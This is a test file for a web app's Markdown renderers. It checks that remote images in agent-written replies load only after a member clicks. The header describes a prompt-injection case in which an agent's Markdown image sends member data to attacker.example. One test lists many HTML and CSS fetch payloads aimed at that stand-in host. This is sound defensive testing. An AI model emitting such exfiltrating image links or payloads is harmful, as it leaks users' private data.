/**
 * A remote image in agent-authored Markdown loads only on a member's click.
 *
 * THE DEFECT this fences: `resolveMediaSrc` passed any `https?:` src through,
 * and the `img` renderer drew it. An agent reply that ended with
 * `![](https://attacker.example/p.png?d=<member data>)` sent the data out the
 * moment the bubble rendered. A prompt injection in anything an agent reads
 * could do it. `src/lib/markdownMedia.ts` holds the threat and the rule.
 *
 * Every renderer of agent Markdown is drawn here for real:
 *  - `MarkdownBody` (the chat bubble, the generative-UI markdown node and
 *    the meeting notes, through `MarkdownMessage`)
 *  - `ArtifactMarkdown` (`ArtifactViewerModal`, view and live preview)
 *  - `DocumentMarkdown` (`DocumentPane`, the side-panel editor)
 *  - `ProseTimelineEntry` (`ThinkingContainer`, reasoning and narration)
 *
 * `vitest.config.ts` runs in `node`, with no DOM. So a "click" here walks the
 * element tree the renderer returns, finds the "Load image" button, and calls
 * its own `onClick`. The next render reads the member's choice back from the
 * store, which is the path a real click takes.
 */
import { createElement, isValidElement, type ReactElement, type ReactNode } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("next/navigation", () => ({ useRouter: () => ({ push: vi.fn() }) }));

import { ArtifactMarkdown } from "@/components/ArtifactViewerModal";
import { DocumentMarkdown } from "@/components/DocumentPane";
import { RemoteImage, RemoteImagePlaceholder } from "@/components/MarkdownImage";
import { MarkdownBody } from "@/components/MarkdownMessage";
import { ProseTimelineEntry } from "@/components/ThinkingContainer";
import { resetRemoteImages } from "@/lib/markdownMedia";

const REMOTE = "https://attacker.example/p.png?d=secret";
const DATA_URI =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

beforeEach(() => resetRemoteImages());

// ─── Helpers ───────────────────────────────────────────────────────────────

/** Every `<img …>` opening tag. */
const imgs = (html: string) => html.match(/<img\b[^>]*>/g) ?? [];

/** The `src` of every `<img>`, decoded the way the browser reads it. */
const imgSrcs = (html: string) =>
  imgs(html).map((tag) => (tag.match(/\ssrc="([^"]*)"/)?.[1] ?? "").replace(/&amp;/g, "&"));

/** True when some `<img>` would fetch from this host. */
const loadsFrom = (html: string, host: string) =>
  imgSrcs(html).some((src) => src.includes(host));

interface FakeEvent {
  preventDefault: () => void;
  stopPropagation: () => void;
}

/**
 * Every "Load image" click handler in a rendered tree. Function components
 * are called to expand them. `RemoteImage` holds the store hook, so it is
 * expanded to the branch it draws before a click: `RemoteImagePlaceholder`.
 * A component that needs a hook (`InAppLink`) throws outside a render, and
 * is skipped.
 */
function loadButtons(node: ReactNode): Array<(e: FakeEvent) => void> {
  const out: Array<(e: FakeEvent) => void> = [];
  const walk = (n: ReactNode): void => {
    if (Array.isArray(n)) {
      n.forEach(walk);
      return;
    }
    if (!isValidElement(n)) return;
    const el = n as ReactElement<Record<string, unknown>>;
    const props = el.props;
    if (el.type === RemoteImage) {
      walk(RemoteImagePlaceholder(props as Parameters<typeof RemoteImagePlaceholder>[0]));
      return;
    }
    if (typeof el.type === "function") {
      let rendered: ReactNode;
      try {
        rendered = (el.type as (p: unknown) => ReactNode)(props);
      } catch {
        return;
      }
      walk(rendered);
      return;
    }
    const label = props["aria-label"];
    if (typeof label === "string" && label.startsWith("Load image") && typeof props.onClick === "function") {
      out.push(props.onClick as (e: FakeEvent) => void);
    }
    walk(props.children as ReactNode);
  };
  walk(node);
  return out;
}

function fakeEvent() {
  return { preventDefault: vi.fn(), stopPropagation: vi.fn() };
}

/** Click every "Load image" button in the tree. Returns the events used. */
function clickLoad(element: ReactElement) {
  const handlers = loadButtons(element);
  expect(handlers.length, "no Load image button in the rendered tree").toBeGreaterThan(0);
  return handlers.map((h) => {
    const e = fakeEvent();
    h(e);
    return e;
  });
}

// ─── The chat bubble: MarkdownBody ─────────────────────────────────────────

const chat = (content: string, extra: Record<string, unknown> = {}) =>
  createElement(MarkdownBody, { content, ...extra });

describe("MarkdownBody — a remote image loads only on a click", () => {
  it("renders no <img> for a remote src before a click, and names the host", () => {
    const html = renderToStaticMarkup(chat(`Here it is ![chart](${REMOTE})`));
    expect(loadsFrom(html, "attacker.example")).toBe(false);
    expect(html).toContain("Image from attacker.example");
    expect(html).toContain("chart");
    expect(html).toContain("Load image");
  });

  it("loads the image with its src after the member clicks", () => {
    const el = chat(`![chart](${REMOTE})`);
    clickLoad(el);
    const html = renderToStaticMarkup(el);
    expect(imgSrcs(html)).toContain(REMOTE);
    expect(html).not.toContain("Image from attacker.example");
  });

  it("a click allows that one URL and no other", () => {
    const other = "https://attacker.example/q.png?d=more";
    clickLoad(chat(`![a](${REMOTE})`));
    const html = renderToStaticMarkup(chat(`![a](${REMOTE}) ![b](${other})`));
    expect(imgSrcs(html)).toContain(REMOTE);
    expect(imgSrcs(html)).not.toContain(other);
  });

  it("draws a data: image at once", () => {
    const html = renderToStaticMarkup(chat(`![dot](${DATA_URI})`));
    expect(imgSrcs(html)).toEqual([DATA_URI]);
    expect(html).not.toContain("Load image");
  });

  it("draws a workspace-relative image at once, through the file proxy", () => {
    const html = renderToStaticMarkup(
      chat("![chart](chart.png)", { sessionId: "s1", mdFilePath: "outputs/report.md" }),
    );
    expect(imgSrcs(html)).toEqual(["/api/agent/workspace/s1/file?path=outputs%2Fchart.png"]);
    expect(html).not.toContain("Load image");
  });

  it("draws a same-origin path at once when there is no session", () => {
    const html = renderToStaticMarkup(chat("![logo](/brand/logo.png)"));
    expect(imgSrcs(html)).toEqual(["/brand/logo.png"]);
  });

  it("gates a protocol-relative src", () => {
    const html = renderToStaticMarkup(chat("![x](//attacker.example/p.png?d=1)"));
    expect(loadsFrom(html, "attacker.example")).toBe(false);
    expect(html).toContain("Image from attacker.example");
  });

  it("gates a same-origin proxy that would fetch the remote URL server-side", () => {
    const proxied = `/api/email/image-proxy?url=${encodeURIComponent(REMOTE)}`;
    const html = renderToStaticMarkup(chat(`![x](${proxied})`));
    expect(imgs(html)).toEqual([]);
    expect(html).toContain("Image from attacker.example");
  });

  it("gates a remote image inside a link, and the click stays out of the link", () => {
    const el = chat(`[![logo](${REMOTE})](https://example.com/page)`);
    const before = renderToStaticMarkup(el);
    expect(loadsFrom(before, "attacker.example")).toBe(false);
    expect(before).toMatch(/<a\b[^>]*href="https:\/\/example\.com\/page"[^>]*>[\s\S]*Image from attacker\.example[\s\S]*<\/a>/);

    const [e] = clickLoad(el);
    expect(e.preventDefault).toHaveBeenCalled();
    expect(e.stopPropagation).toHaveBeenCalled();
    expect(imgSrcs(renderToStaticMarkup(el))).toContain(REMOTE);
  });

  it("draws a raw HTML <img> in a chat message as text, never an element", () => {
    const html = renderToStaticMarkup(chat(`<img src="${REMOTE}">`));
    expect(imgs(html)).toEqual([]);
  });
});

// ─── The artifact viewer: ArtifactMarkdown (raw HTML on) ───────────────────

const artifact = (content: string) =>
  createElement(ArtifactMarkdown, { content, sessionId: "s1", mdFilePath: "outputs/report.md" });

describe("ArtifactMarkdown — a remote image loads only on a click", () => {
  it("gates a Markdown image, and loads it after a click", () => {
    const el = artifact(`![chart](${REMOTE})`);
    const before = renderToStaticMarkup(el);
    expect(loadsFrom(before, "attacker.example")).toBe(false);
    expect(before).toContain("Image from attacker.example");
    clickLoad(el);
    expect(imgSrcs(renderToStaticMarkup(el))).toContain(REMOTE);
  });

  it("gates a raw HTML <img>, and loads it after a click", () => {
    const el = artifact(`<p>Report</p>\n\n<img src="${REMOTE}" alt="raw">`);
    const before = renderToStaticMarkup(el);
    expect(loadsFrom(before, "attacker.example")).toBe(false);
    expect(before).toContain("Image from attacker.example");
    clickLoad(el);
    expect(imgSrcs(renderToStaticMarkup(el))).toContain(REMOTE);
  });

  it("gates a remote image inside a link", () => {
    const el = artifact(`[![logo](${REMOTE})](https://example.com/page)`);
    expect(loadsFrom(renderToStaticMarkup(el), "attacker.example")).toBe(false);
    clickLoad(el);
    expect(imgSrcs(renderToStaticMarkup(el))).toContain(REMOTE);
  });

  it("draws a data: image and a workspace-relative image at once", () => {
    const html = renderToStaticMarkup(artifact(`![dot](${DATA_URI})\n\n![chart](chart.png)`));
    expect(imgSrcs(html)).toEqual([DATA_URI, "/api/agent/workspace/s1/file?path=outputs%2Fchart.png"]);
    expect(html).not.toContain("Load image");
  });

  it("never passes a srcset, even after the click", () => {
    const el = artifact(`<img src="${REMOTE}" srcset="https://attacker.example/2x.png 2x">`);
    clickLoad(el);
    const html = renderToStaticMarkup(el);
    expect(html).not.toMatch(/srcset/i);
    expect(html).not.toContain("2x.png");
  });

  it("strips every other remote fetch that raw HTML can make on render", () => {
    const html = renderToStaticMarkup(
      artifact(
        [
          `<picture><source srcset="https://attacker.example/s.webp"><img src="local.png" alt="pic"></picture>`,
          `<video poster="https://attacker.example/v.jpg" src="https://attacker.example/v.mp4"><source src="https://attacker.example/v2.mp4"><track src="https://attacker.example/t.vtt"></video>`,
          `<audio src="https://attacker.example/a.mp3"></audio>`,
          `<div style="background:url(https://attacker.example/bg.png)">bg</div>`,
          `<div style="background:\\75 rl(https://attacker.example/esc.png)">esc</div>`,
          `<table background="https://attacker.example/t.png"><tr><td>cell</td></tr></table>`,
          `<svg><image href="https://attacker.example/i.png"></image><rect fill="url(https://attacker.example/f.svg#p)"></rect></svg>`,
          `<input type="image" src="https://attacker.example/in.png">`,
          `<script async src="https://attacker.example/x.js"></script>`,
          `<link rel="stylesheet" href="https://attacker.example/x.css">`,
          `<link rel="dns-prefetch" href="//attacker.example">`,
          `<meta http-equiv="refresh" content="0;url=https://attacker.example/">`,
          `<style>@import url(https://attacker.example/i.css);</style>`,
          `<iframe src="https://attacker.example/f.html"></iframe>`,
          `<object data="https://attacker.example/o.svg"></object>`,
          `<embed src="https://attacker.example/e.swf">`,
          `<base href="https://attacker.example/">`,
          `<template><img src="https://attacker.example/tpl.png"></template>`,
          `<video poster="/api/email/image-proxy?url=https%3A%2F%2Fattacker.example%2Fp.jpg"></video>`,
        ].join("\n\n"),
      ),
    );
    expect(html).not.toContain("attacker.example");
    expect(html).not.toMatch(/<(script|link|meta|style|iframe|object|embed|base|template)\b/);
    // What is local keeps working: the picture's own img, through the proxy.
    expect(imgSrcs(html)).toEqual(["/api/agent/workspace/s1/file?path=outputs%2Flocal.png"]);
  });

  it("keeps a style that fetches nothing, and a fragment url()", () => {
    const html = renderToStaticMarkup(
      artifact(`<div style="color: red">red</div>\n\n<svg><rect fill="url(#grad)"></rect></svg>`),
    );
    expect(html).toContain('style="color:red"');
    expect(html).toContain('fill="url(#grad)"');
  });

  it("keeps a link's href: following it needs a click", () => {
    const html = renderToStaticMarkup(artifact(`<a href="https://example.com/doc">doc</a>`));
    expect(html).toContain('href="https://example.com/doc"');
  });
});

// ─── The side-panel editor: DocumentMarkdown (raw HTML on) ─────────────────

describe("DocumentMarkdown — a remote image loads only on a click", () => {
  const doc = (content: string) => createElement(DocumentMarkdown, { content });

  it("gates a Markdown image and a raw HTML <img>, and loads them after a click", () => {
    const el = doc(`![md](${REMOTE})\n\n<img src="${REMOTE}" alt="raw">`);
    const before = renderToStaticMarkup(el);
    expect(loadsFrom(before, "attacker.example")).toBe(false);
    expect(before.match(/Image from attacker\.example/g)?.length).toBe(2);
    clickLoad(el);
    expect(imgSrcs(renderToStaticMarkup(el))).toEqual([REMOTE, REMOTE]);
  });

  it("strips a remote script, stylesheet and CSS url()", () => {
    const html = renderToStaticMarkup(
      doc(
        `<script async src="https://attacker.example/x.js"></script>\n\n` +
          `<link rel="stylesheet" href="https://attacker.example/x.css">\n\n` +
          `<p style="background-image:url('https://attacker.example/bg.png')">p</p>`,
      ),
    );
    expect(html).not.toContain("attacker.example");
  });

  it("draws a data: image at once", () => {
    expect(imgSrcs(renderToStaticMarkup(doc(`![dot](${DATA_URI})`)))).toEqual([DATA_URI]);
  });
});

// ─── Reasoning and narration: ThinkingContainer ────────────────────────────

describe("ThinkingContainer's prose — a remote image loads only on a click", () => {
  const prose = (text: string) =>
    createElement(ProseTimelineEntry, {
      text,
      live: false,
      icon: () => null,
      iconClass: "",
    } as unknown as Parameters<typeof ProseTimelineEntry>[0]);

  it("gates a remote image in a reasoning block, and loads it after a click", () => {
    const el = prose(`Thinking ![x](${REMOTE})`);
    const before = renderToStaticMarkup(el);
    expect(loadsFrom(before, "attacker.example")).toBe(false);
    expect(before).toContain("Image from attacker.example");
    clickLoad(el);
    expect(imgSrcs(renderToStaticMarkup(el))).toContain(REMOTE);
  });
});
